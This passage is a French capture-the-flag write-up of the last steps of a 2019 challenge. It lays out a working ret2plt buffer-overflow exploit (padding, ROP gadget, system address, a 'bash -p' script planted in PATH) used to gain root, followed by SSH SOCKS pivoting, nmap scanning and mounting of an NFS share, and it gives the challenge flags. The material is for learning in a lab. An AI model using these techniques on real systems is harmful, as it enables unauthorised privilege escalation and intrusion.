Dans le cadre de l'exploitation de __exportVIP__, le _bit NX_ est activé, et sans doute l'_ASLR_ . Enfin l'outil __readelf__ permet d'obtenir des informations complémentaires comme les fonctions présentes dans la _plt_, le contenu de la _got_ et bien d'autres choses.

```bash
(KaliVM) ➜ readelf -a ./exportVIP

[...]
Section de réadressage '.rela.plt' à l\'adresse de décalage 0x528 contient 8 entrées:
  Décalage        Info           Type           Val.-symboles Noms-symb.+ Addenda
000000404018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 strncpy@GLIBC_2.2.5 + 0
000000404020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
000000404028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 strlen@GLIBC_2.2.5 + 0
000000404030  000400000007 R_X86_64_JUMP_SLO 0000000000000000 system@GLIBC_2.2.5 + 0
000000404038  000500000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
000000404040  000600000007 R_X86_64_JUMP_SLO 0000000000000000 snprintf@GLIBC_2.2.5 + 0
000000404048  000700000007 R_X86_64_JUMP_SLO 0000000000000000 memset@GLIBC_2.2.5 + 0
000000404050  000a00000007 R_X86_64_JUMP_SLO 0000000000000000 __isoc99_scanf@GLIBC_2.7 + 0
[...]
```

La fonction __system__ étant présente dans la plt du binaire, cela va nous faciliter l'exploitation. En effet, si l'on se réfère au schéma de la figure 42, il faudrait leak une adresse de la libc, récupérer l'adresse de base de la libc et appeler la fonction _system_.  Geluchat a fait un bon [article](https://www.dailysecurity.fr/return_oriented_programming/) sur son blog à ce sujet.

Dans le cas du binaire _exportVIP_, la fonction _system_ est déjà présente dans le programme. Il suffit donc de l'appeler en plaçant l'argument voulu.

### XII.3. Explication de l'exploitation

L'objectif est d'appeler la fonction _system_ avec un paramètre contrôlé. Pour cela, il est impératif de trouver un buffer overflow pour pouvoir réécrire RIP pour rediriger le flux d'exécution sur l'adresse de _system_, si on veut résumer. Pour trouver le buffer overflow, il existe deux écoles : reverse en statique ou à grand coup de tests dynamiques (il est possible de mixer les deux). Pour rappel, le binaire ne contient pas les symboles de debug.

Lorsque le signal système _SIGSEGV_ est levé, cela signifie que le programme concerné à __segmentation fault__. En d'autres termes, une fonction du programme a tenté d'accéder à une zone mémoire non existante ou non autorisée. Dans le cadre d'une exploitation d'un buffer overflow, c'est une bonne chose, car RIP a bien été réécrit. Il va falloir trouver le bon padding pour réécrire RIP. Dans la convention de l'assembleur 64 bits, le premier argument d'une fonction se place dans le registre _rdi_. Afin d'exécuter la charge utile, il est possible de trouver une chaîne de caractère dans le programme _exportVIP_, comme "GNU" par exemple. Cette chaîne est présente dans tous les ELF (binaire linux). 

Lorsque la chaîne a été choisie, il faut trouver son adresse dans le binaire ; _exportVIP_ n'étant pas soumis à la PIE, cette adresse ne changera pas. Enfin, il ne reste qu'à créer un script s'appelant comme la chaîne choisi et à l'ajouter dans le _PATH_. En résumé, l'objectif est de faire :

```c
system("GNU");
```

Pour placer "GNU" dans _rdi_, il faut trouver un gadget. Un gadget est une suite d'instruction assembleur présente dans le binaire. Il faut donc trouver un gadget `pop rdi; ret`. Pour rappel, la stack fonctionne comme ceci : 


![](/lib/images/writeups/2019_wonkachallenge/stack.jpg)


Au final, le payload d'exploitation final devra ressembler à :

```bash
padding + gadget + adresse de GNU + adresse de system
```

### XII.4. Exploitation

#### XII.4.a. Déterminer le padding

Lorsque l'on cherche le padding d'un buffer overflow, la librairie __pwntool__ peut être utile, car elle nous permet de générer un pattern. Ce pattern d'une taille arbitraire mais suffisamment grande servira à faire _segfault_ le programme. La valeur contenu dans RSP servira à déterminer la taille du padding :

```python
from pwn import *

# generate pattern
cyclic(400)

# find offset
find_cyclic('yaac')
296
```


![](/lib/images/writeups/2019_wonkachallenge/step12_padding.png)


Le padding pour contrôler RIP est de 296 octets.

_Note_ : L'instruction __ret__ étant un alias pour `pop rip`, il faut donc observer le contenu du stack pointer, soit __rsp__.

#### XII.4.b. Récupérer l'adresse de system

Pour trouver l'adresse de `system`, il n'est pas nécessaire de sortir l'artillerie lourde (IDA Pro, Ghidra...). Un simple __objdump__ fait l'affaire :

```bash
(KaliVM) ➜ objdump -D ./exportVIP | grep system
0000000000401060 <system@plt>:
  40133d:	e8 1e fd ff ff       	callq  401060 <system@plt>
```

Le _call_ de _system_ dans le binaire est à l'adresse __0x40133d__.

#### XII.4.c. Trouver un bon gadget

Lister les gadgets d'un binaire peut se faire avec l'outil __ROPGadget__. Il permet de trouver les différents gadget et leur adresse. Pour rappel on cherche un `pop rdi; ret` :

```bash
(KaliVM) ➜ ROPgadget.py --binary ../exportVIP

[...]
0x000000000040145b : pop rdi ; ret
[...]
```

L'adresse du gadget est donc __0x000000000040145b__

#### XII.4.d. Trouver l'adresse de la chaîne GNU

La dernière pièce du puzzle est l'adresse de la chaîne __GNU__ dans _exportVIP_. Toujours avec __objdump__, il est possible de récupérer l'adresse de cette chaîne :

```bash
(KaliVM) ➜ objdump -s /home/maki/Documents/wonkachall2019/step8/exportVIP
```


![](/lib/images/writeups/2019_wonkachallenge/step12_gnuaddr.png)


L'adresse de __GNU__ n'est pas vraiment __0x4002d0__, on peut voir que ce n'est pas aligné. Il suffit d'enlever 4 octets :

```python
>>> hex(0x4002d4-0x4)
'0x4002d0'
```

L'adresse de __GNU__ est : __0x4002d0__

#### XII.4.e. Ajout d'un binaire GNU dans le PATH

Le binaire "GNU" va contenir un simple `bash -p`, l'argument permet de garder les droits de l'utilisateur pendant l'exécution. 

```bash
#!/bin/bash -p

/bin/bash -p
```

Ce script sera stocké dans le dossier __/tmp__ :

```bash
(SRV02-BACKUP as Georgina) ➜ vim /tmp/GNU # Collage du script ci-dessus
(SRV02-BACKUP as Georgina) ➜ chmod 777 /tmp/GNU
(SRV02-BACKUP as Georgina) ➜ export PATH=$PATH:/tmp
```

### XII.5. Exécution

Tous les paramètres sont maintenant disponibles : le padding, l'adresse du gadget, l'adresse de GNU et l'adresse de système. Il ne reste plus qu'à exploiter.

```bash
(SRV02-BACKUP as Georgina) ➜ /opt/exportVIP < <(python -c 'from pwn import *; print "a"*296+p64(0x000000000040145b)+p64(0x4002d0)+p64(0x40133d)';cat)
```


![](/lib/images/writeups/2019_wonkachallenge/step12_root.png)


_Note_ : La librairie _pwntool_ est disponible sur le serveur distant. C'est plutôt rare, mais c'est arrangeant.

Le flag de cette étape se trouve dans le dossier _/root_.

### XII.6. Flag

> 6f424a5e3b001ee6a832581680169e2f687d8d6e493bdb4b26d518798f7b3c30

---

### Resources

1. __Rémi Martin__, _Exploitation – ByPass ASLR+NX with ret2plt_, shoxx-website : http://shoxx-website.com/2016/05/exploitation-bypass-aslrnx-with-ret2plt.html
2. __Geluchat__, _Petit Manuel du ROP à l'usage des débutants_, dailysecurity : https://www.dailysecurity.fr/return_oriented_programming/

---
---

## XIII. Step 13 - The final countdown

>  SHA256(WillyWonka's chief name) 

### TL;DR

1. Trouver la machine qui manque sur le schéma réseau avec arp : `cat /proc/net/arp` ;
2. Mettre en place un __proxychains__ avec la machine précédente en tant que pivot ;
3. Faire un scan de port avec nmap sur la nouvelle cible, voir le `nfs` sur le port 2049 ;
4. Monter le nfs distant sur la machine de pivot ;
5. Copier les fichiers du partage réseau ; 
6. Analyser les métadonnées avec __exiftool__ et trouver que __Grandma Josephine__ est le chef de _Willy Wonka_.

---

### XIII.1. Post exploitation

Le schéma trouvé sur le serveur _SRV01-INTRANET_ est incomplet. En effet, la machine __SRV03-FILER__ est tagguée en tant que "TODO". L'épreuve finale doit consister en l'accès à cette dernière machine. Avant de passer à la suite, il convient de se connecter en _root_ au serveur _SRV02-BACKUP_ avec un réel accès SSH. La clé privée est disponible [ici](https://mega.nz/#!q25BzSLZ!w9_4B8q7YTCgrUoMYkWPmyRn374xBZhxarUtYmgJJGc).

L'objectif est de trouver le chef de _Willy Wonka_. Comme pour la première étape de la dixième épreuve (cf. X.1. Reconnaissance), il est intéressant de vérifier le contenu du cache arp :

```bash
(SRV02-BACKUP as root) ➜ cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
172.16.69.23     0x1         0x2         ce:d3:94:6c:38:3f     *        ens18
172.16.69.78     0x1         0x2         7a:0a:61:1a:36:65     *        ens18
172.16.69.254    0x1         0x2         3e:20:13:a5:09:49     *        ens18
```

Une nouvelle IP est apparut : __172.16.69.23__. Sûrement la machine nommée __SRV03-FILER__. Celle-ci n'a pas l'air accessible directement malgré les routes en place. Cependant, ayant un accès SSH à la machine _SRV02-BACKUP_, il est possible de faire un pivot.

### XIII.2. Mise en place du pivot

Pour faire un pivot, il existe au moins deux outils pertinents : __proxychains__ et __sshuttle__. Dans les deux cas, il est nécessaire de faire suivre un port de la machine pivot (SRV02-BACKUP) et la machine de l'attaquant (KaliVM). Pour cette configuration, l'architecture présentée dans l'introduction a été abandonnée. Le _VPN du WonkaChall_ est directement dans la _KaliVM_. 

```bash
(KaliVM) ➜ ssh -D 1080 root@172.16.69.65 -i ./id_rsa_root
```

La configuration de proxychains :

```bash
[...]
# Quiet mode (no output from library)
quiet_mode
[...]
socks4 	127.0.0.1 1080
```

Le pivot est désormais mis en place. Il est possible pour la _KaliVM_ d'accéder à __SRV03-FILER__.

### XIII.3. Scan de port

Le scan de port devenant une coutume lors de la découverte d'un nouvel hôte, celui-ci ne va pas échapper à la règle :

```bash
(KaliVM) ➜ proxychains nmap -F -sT -Pn -T4 -vvv 172.16.69.23 
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-22 01:16 CEST
[...]
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
111/tcp  open  rpcbind syn-ack
2049/tcp open  nfs     syn-ack
```

En considérant les trois ports ouverts, l'hypothèse la plus probable est l'accès au __Network File System__ (nfs) sur le port _2049/tcp_.

### XIII.4. Montage du volume NFS

La tentative de montage en passant par _proxychains_ est un échec. La solution la plus simple est de monter ce volume sur le serveur _SRV02-BACKUP_ :

```bash
(SRV02-BACKUP as root) ➜ mkdir /tmp/a
(SRV02-BACKUP as root) ➜ mount -t nfs 172.16.69.23:/ /tmp/a
(SRV02-BACKUP as root) ➜ ls /tmp/a
DATA
```

Le volume est monté avec succès. Il contient beaucoup _d'images_, un _docx_ et un _pdf_ :

```bash
(SRV02-BACKUP as root) ➜  ls -laR /tmp/a/DATA
[...]
./pictures:
total 11652
drwxr-x--x  2 nobody nogroup    4096 juil.  4 10:51 .
drwxr-xr-x 11 root   root       4096 juin  24 17:43 ..
-rw-r--r--  1 nobody nogroup  131823 juil.  4 10:50 ascenseurRedTeam.png
-rw-r--r--  1 nobody nogroup 1901579 juil.  4 10:50 cinemaRedTeam.png
-rw-r--r--  1 nobody nogroup  196371 juil.  4 10:50 croissantageSaif.png
-rw-r--r--  1 nobody nogroup  130839 juil.  4 10:50 demenagement.png
-rw-r--r--  1 nobody nogroup  153995 juil.  4 10:50 glace.png
-rw-r--r--  1 nobody nogroup   37247 juil.  4 10:50 kenkenken.png
-rw-r--r--  1 nobody nogroup  138224 juil.  4 10:50 keskiamaintenant.png
-rw-r--r--  1 nobody nogroup  190794 juil.  4 10:50 miam.png
-rw-r--r--  1 nobody nogroup  116749 juil.  4 10:50 newyork.png
-rw-r--r--  1 nobody nogroup   86819 juil.  4 10:50 notredame.png
-rw-r--r--  1 nobody nogroup  965251 juil.  4 10:50 onPartEnRestitution.jpg
-rw-r--r--  1 nobody nogroup 2196730 juil.  4 10:50 onVeutDuPain.png
-rw-r--r--  1 nobody nogroup 1039727 juil.  4 10:50 plage.png
-rw-r--r--  1 nobody nogroup  104879 juil.  4 10:50 redabogoss.png
-rw-r--r--  1 nobody nogroup  137275 juil.  4 10:50 redaSport.png
-rw-r--r--  1 nobody nogroup 2043318 juil.  4 10:50 rootagedADsurDouchette.png
-rw-r--r--  1 nobody nogroup  182331 juil.  4 10:50 rootagedemeres.png
-rw-r--r--  1 nobody nogroup 1968672 juil.  4 10:50 soireeAvantPentest.png
-rw-r--r--  1 nobody nogroup   69753 juil.  4 10:50 soireepicol.png
-rw-r--r--  1 nobody nogroup   93357 juil.  4 10:50 toiletteAmehdi.png
[...]
./VIP:
total 408
drwxr-x--x  2 nobody nogroup   4096 juil.  5 16:59 .
drwxr-xr-x 11 root   root      4096 juin  24 17:43 ..
-rw-r--r--  1 nobody nogroup  88168 juil.  5 16:58 flag_lol.jpg
-rw-r--r--  1 nobody nogroup  30234 juil.  3 19:15 INVOICE.docx
-rw-r--r--  1 nobody nogroup 127983 juil.  3 19:15 INVOICE.pdf
-rw-r--r--  1 nobody nogroup 152189 juil.  5 16:58 whiteboard.jpg
```

L'identité du chef de Willy Wonka doit se trouver dans les métadonnées d'un des fichiers du volume.

### XIII.5. Copie des fichiers du volume

Encore une fois, la solution la plus simple et la plus rapide reste de copier l'ensemble des fichiers du dossier __VIP__ sur _KaliVM_ :

```bash
(KaliVM) ➜ scp -r -i ../id_rsa_root root@172.16.69.65:/tmp/a/DATA/VIP/ .    
INVOICE.pdf                                                                       100%  125KB   1.9MB/s   00:00    
flag_lol.jpg                                                                      100%   86KB   2.6MB/s   00:00    
INVOICE.docx                                                                      100%   30KB   1.9MB/s   00:00    
whiteboard.jpg                                                                    100%  149KB   3.1MB/s   00:00  

(KaliVM) ➜ exiftool * | grep -i 'author'
Author                          : Grandma Josephine
```

Le flag final est le SHA256 de "Grandma Josephine".

### XIII.6. Flag

> b8a3ef108d0c3fac75f3f99f4d6465db8b85b29f41edcfb419a986ca861239f9

---

### Resources

1. __Bima Fajar Ramadhan__, _ProxyChains Tutorial_, linuxhint : https://linuxhint.com/proxychains-tutorial/
2. __Equipe de developpez__, _NFS : le partage de fichiers sous Unix_, developpez.com : https://linux.developpez.com/formation_debian/nfs.html

---
---

## Conclusion

Pour conclure, le WonkaChallenge d'Akerva m'a permis de travailler sur des technologies à jour, et ça a été vraiment agréable. La difficulté globale du challenge a bien été dosée, malgré les différentes catégories parcourues. D'un point de vue plus personnel, j'ai appris plusieurs choses : interagir avec des bucket s3, déployer une application via host-manager pour exploiter un serveur tomcat, le resource based constrained delegation pour impersonate un utilisateur sur l'active directory et enfin le ret2plt.

Enfin, l'infrastructure du challenge a très bien résisté à l'assaut de plusieurs dizaines (centaines ?) de challengers. C'était agréable de pouvoir travailler sur le challenge sans bugs ou autres problèmes de stabilité. Seule l'utilisation du psexec juste après l'exploitation du rbcd a été un peu chaotique.

Pour clore ce writeup, je souhaite remercier l'équipe d'Akerva en charge du challenge. C'était de belles épreuves, et j'ai hâte de jouer le Wonka3 l'année prochaine !


![](/lib/images/writeups/2019_wonkachallenge/flag_lol.jpg)
